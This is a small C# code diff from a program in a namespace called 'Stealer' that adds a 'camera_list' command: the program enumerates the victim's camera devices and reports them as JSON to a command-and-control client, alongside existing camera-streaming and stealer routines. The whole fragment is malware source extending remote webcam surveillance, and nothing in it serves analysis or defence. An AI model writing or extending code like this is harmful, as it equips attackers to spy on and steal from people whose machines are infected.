@@ -95,6 +95,11 @@ namespace Stealer
             {
                 CameraStream.Stop();
             }
+            else if (cmdLower == "camera_list")
+            {
+                string jsonList = CameraStream.GetCameraListJson();
+                C2Client.SendText("{\"type\":\"camera_list\",\"devices\":" + jsonList + "}");
+            }
         }
 
         private static void RunStealer()
